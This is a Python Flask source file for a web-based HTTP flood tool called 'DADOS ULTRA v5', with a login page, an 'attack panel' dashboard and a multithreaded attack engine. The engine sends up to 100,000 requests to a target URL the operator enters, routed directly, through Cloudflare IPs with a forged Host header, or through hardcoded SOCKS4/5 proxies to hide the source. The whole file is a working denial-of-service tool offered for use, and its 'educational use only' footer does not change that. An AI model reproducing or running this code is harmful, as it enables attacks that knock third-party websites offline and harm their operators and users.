from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []

# ⚡ Cloudflare IP Range + SOCKS5 Proxies
CF_IPS = ["104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5","104.16.0.1","104.16.0.2"]
SOCKS5_PROXIES = ["94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080","176.114.86.151:1080"]
SOCKS4_PROXIES = ["174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145","88.204.142.108:1080"]

# ============================================
# UI - ULTRA KILLER VIBES
# ============================================
LOGIN = """<!DOCTYPE html><html><head><title>💀 DADOS ULTRA v5</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Courier New',monospace;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,0,0.1) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;animation:moveBg 10s linear infinite}
@keyframes moveBg{0%{transform:translate(0,0)}100%{transform:translate(40px,40px)}}
.box{background:rgba(10,0,0,0.9);padding:40px;border-radius:20px;border:2px solid #ff0000;width:380px;text-align:center;box-shadow:0 0 80px rgba(255,0,0,0.5),inset 0 0 50px rgba(255,0,0,0.1);z-index:1;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{box-shadow:0 0 60px rgba(255,0,0,0.4)}50%{box-shadow:0 0 120px rgba(255,0,0,0.8)}}
h1{font-size:2.5em;background:linear-gradient(180deg,#ff0000,#ff4444,#ff0000);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:none;margin-bottom:5px}
.glitch{animation:glitch 1s infinite}
@keyframes glitch{0%,100%{transform:translate(0)}20%{transform:translate(-2px,2px)}40%{transform:translate(-2px,-2px)}60%{transform:translate(2px,2px)}80%{transform:translate(2px,-2px)}}
.tag{color:#ff8800;font-size:0.8em;letter-spacing:3px;margin:5px 0}
input{width:100%;padding:15px;background:rgba(0,0,0,0.8);border:1px solid #ff0000;border-radius:10px;color:#ff0000;margin:10px 0;font-family:monospace;font-size:14px;transition:0.3s}
input:focus{border-color:#ff4444;box-shadow:0 0 20px rgba(255,0,0,0.5);outline:none}
.btn{width:100%;padding:15px;background:linear-gradient(135deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:16px;margin-top:15px;text-transform:uppercase;letter-spacing:2px;transition:0.3s}
.btn:hover{box-shadow:0 0 40px #ff0000;transform:scale(1.03)}
</style></head><body>
<div class="box">
<h1 class="glitch">💀 DADOS</h1>
<div class="tag">⚡ ULTRA KILLER v5.0 ⚡</div>
<p style="color:#888;font-size:0.7em;margin:10px 0">IP ROTATION | CF BYPASS | SOCKS</p>
<form method="post">
<input type="text" name="user" placeholder="🔑 USERNAME" required>
<input type="password" name="pass" placeholder="🔐 PASSWORD" required>
<button class="btn" type="submit">☠️ ACCESS SYSTEM</button>
</form>
{% if error %}<p style="color:red;margin-top:10px">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = """<!DOCTYPE html><html><head><title>💀 DADOS v5 | ATTACK PANEL</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#ff0000;font-family:'Courier New',monospace;padding:15px;overflow-x:hidden}
.scanline{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.1) 0px,rgba(0,0,0,0.1) 2px,transparent 2px,transparent 4px);pointer-events:none;z-index:999}
.header{text-align:center;padding:20px;border:2px solid #ff0000;border-radius:15px;margin-bottom:20px;background:linear-gradient(180deg,rgba(20,0,0,0.9),rgba(0,0,0,0.9));box-shadow:0 0 50px rgba(255,0,0,0.3);position:relative}
.header h1{font-size:2.2em;text-shadow:0 0 30px #ff0000;letter-spacing:5px}
.header .sub{color:#ff8800;font-size:0.7em;letter-spacing:3px}
.card{background:rgba(10,0,0,0.8);border:1px solid #ff0000;border-radius:10px;padding:20px;margin:15px 0;box-shadow:0 0 20px rgba(255,0,0,0.1)}
.card h3{color:#ff4444;margin-bottom:12px;font-size:1.1em;letter-spacing:2px}
input,select{width:100%;padding:12px;background:rgba(0,0,0,0.9);border:1px solid #ff0000;border-radius:8px;color:#ff0000;margin:8px 0;font-family:monospace;font-size:13px}
input:focus,select:focus{border-color:#ff4444;box-shadow:0 0 15px rgba(255,0,0,0.5);outline:none}
label{color:#888;font-size:10px;text-transform:uppercase;letter-spacing:2px;display:block;margin-top:8px}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;margin:8px 0;font-size:13px;text-transform:uppercase;letter-spacing:3px;transition:0.3s}
.btn:hover{box-shadow:0 0 30px #ff0000;transform:scale(1.01)}
.btn-cf{background:linear-gradient(135deg,#ff8800,#cc6600)}.btn-stop{background:#333;color:#ff0000}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.col3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:15px}
.stat{background:rgba(10,0,0,0.8);padding:15px;text-align:center;border-radius:10px;border:1px solid #ff0000}
.stat-val{font-size:2em;font-weight:bold}.s{color:#00ff00}.f{color:#ff0000}.t{color:#ff8800}
.stat-label{font-size:9px;color:#888;text-transform:uppercase;letter-spacing:2px}
.logs{background:rgba(0,0,0,0.9);padding:10px;border-radius:5px;max-height:220px;overflow:auto;font-size:10px;margin-top:10px;border:1px solid #333;color:#0f0}
.log{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.05)}
.badge{padding:4px 12px;border-radius:20px;font-size:9px;display:inline-block;text-transform:uppercase;letter-spacing:2px}
.running{background:rgba(255,0,0,0.2);color:#ff0000;animation:pulse 1s infinite}
@keyframes pulse{50%{opacity:0.5}}
.footer{text-align:center;padding:15px;color:#333;font-size:10px;letter-spacing:3px;margin-top:10px}
</style></head><body>
<div class="scanline"></div>
<div class="header">
<h1>💀 DADOS ULTRA v5.0</h1>
<div class="sub">☠️ GOD LEVEL ATTACK SYSTEM ☠️</div>
<p style="color:#666;font-size:0.6em;margin-top:5px">IP ROTATION | CLOUDFLARE BYPASS | SOCKS4/5</p>
</div>

<div class="col3">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>

<div class="card">
<h3>🎯 TARGET CONFIG</h3>
<div class="row"><div><label>TARGET URL</label><input id="url" placeholder="https://target.com/api"></div><div><label>REQUESTS</label><input type="number" id="count" value="1000"></div></div>
<label>ATTACK MODE</label>
<select id="mode">
<option value="direct">⚡ DIRECT (Fastest)</option>
<option value="cf">🌐 Cloudflare IP Rotation</option>
<option value="socks5">🔒 SOCKS5 Proxy</option>
<option value="socks4">🔒 SOCKS4 Proxy</option>
<option value="mixed">💀 MIXED (CF + SOCKS5)</option>
<option value="all">☠️ ALL METHODS</option>
</select>
<label>SPEED</label>
<select id="speed"><option value="slow">🐢 Slow</option><option value="fast" selected>⚡ Fast</option><option value="ultra">💀 ULTRA</option></select>
<button class="btn" onclick="start()">🚀 LAUNCH ATTACK</button>
<button class="btn btn-stop" onclick="stop()">⏹️ EMERGENCY STOP</button>
<div id="status"></div>
</div>

<div class="card"><h3>📜 LIVE BATTLE LOGS</h3><div class="logs" id="logs"></div></div>
<div class="footer">💀 BRONX ULTRA | DADOS v5.0 | FOR EDUCATIONAL USE ONLY 💀</div>

<script>
function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>`<div class="log">${x}</div>`).join('')})}
function start(){let url=document.getElementById('url').value;let count=document.getElementById('count').value;let speed=document.getElementById('speed').value;let mode=document.getElementById('mode').value;if(!url)return alert('🎯 Enter Target URL!');fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed,mode})}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span class="badge running">⚡ ATTACK IN PROGRESS</span>';l();u()})}
function stop(){fetch('/stop',{method:'POST'}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span style="color:#666">⏹️ ATTACK TERMINATED</span>';l()})}
setInterval(()=>{l();u()},1000)
</script></body></html>"""

# ============================================
# ✅ ATTACK ENGINE - ALL MODES
# ============================================
def send_direct(url):
    try:
        requests.get(url, timeout=10, headers={"User-Agent":"Mozilla/5.0"})
        return True
    except: return False

def send_cf(url, cf_ip):
    try:
        headers = {"Host": url.split("/")[2], "User-Agent":"Mozilla/5.0"}
        target = f"https://{cf_ip}/"
        requests.get(target, headers=headers, timeout=10, verify=False)
        return True
    except: return False

def send_socks5(url, proxy):
    try:
        p = {"http":f"socks5://{proxy}","https":f"socks5://{proxy}"}
        requests.get(url, proxies=p, timeout=15, headers={"User-Agent":"Mozilla/5.0"})
        return True
    except: return False

def send_socks4(url, proxy):
    try:
        p = {"http":f"socks4://{proxy}","https":f"socks4://{proxy}"}
        requests.get(url, proxies=p, timeout=15, headers={"User-Agent":"Mozilla/5.0"})
        return True
    except: return False

def run_attack(attack_id, url, count, speed, mode):
    delays = {"slow":0.1,"fast":0.01,"ultra":0.001}
    delay = delays.get(speed,0.01)
    
    for i in range(count):
        if attack_id not in active_attacks: break
        
        success = False
        
        if mode == "direct":
            success = send_direct(url)
        elif mode == "cf":
            cf_ip = random.choice(CF_IPS)
            success = send_cf(url, cf_ip)
        elif mode == "socks5":
            proxy = random.choice(SOCKS5_PROXIES)
            success = send_socks5(url, proxy)
        elif mode == "socks4":
            proxy = random.choice(SOCKS4_PROXIES)
            success = send_socks4(url, proxy)
        elif mode == "mixed":
            if random.random() > 0.5:
                success = send_cf(url, random.choice(CF_IPS))
            else:
                success = send_socks5(url, random.choice(SOCKS5_PROXIES))
        elif mode == "all":
            r = random.random()
            if r < 0.25: success = send_direct(url)
            elif r < 0.5: success = send_cf(url, random.choice(CF_IPS))
            elif r < 0.75: success = send_socks5(url, random.choice(SOCKS5_PROXIES))
            else: success = send_socks4(url, random.choice(SOCKS4_PROXIES))
        
        if success: attack_stats["success"] += 1
        else: attack_stats["failed"] += 1
        attack_stats["total"] += 1
        
        if i % 50 == 0:
            attack_logs.append(f"⚡ [{mode.upper()}] ✅{attack_stats['success']} ❌{attack_stats['failed']} 📊{attack_stats['total']}/{count}")
        if len(attack_logs) > 100: attack_logs.pop(0)
        time.sleep(delay)
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    attack_logs.append(f"🏁 COMPLETE: ✅{attack_stats['success']} ❌{attack_stats['failed']} | MODE: {mode.upper()}")

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="⛔ ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(d.get('count',100),100000)
    speed = d.get('speed','fast')
    mode = d.get('mode','direct')
    if not url: return jsonify({"error":"URL required"}),400
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🔥 TARGET: {url} | MODE: {mode.upper()} | {count} REQ | {speed.upper()}")
    t = threading.Thread(target=run_attack, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append("⏹️ ATTACK TERMINATED BY USER")
    return jsonify({"status":"stopped"})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-30:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port)
